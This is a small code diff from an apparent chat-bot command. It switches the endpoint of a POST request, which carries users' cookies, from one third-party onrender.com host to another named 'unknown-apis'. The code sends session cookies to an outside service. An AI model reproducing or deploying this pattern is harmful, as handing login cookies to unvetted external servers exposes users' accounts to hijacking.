@@ -39,7 +39,7 @@ return;
     
 api.sendMessage(`🕒 Getting response on website. . .`, event.threadID, event.messageID);
 
-       const response = await fetch('https://gemini-ai-uk.onrender.com/share/submit', {
+       const response = await fetch('https://unknown-apis.onrender.com/share/submit', {
                method: 'POST',
                body: JSON.stringify({
                  cookie: cookies,
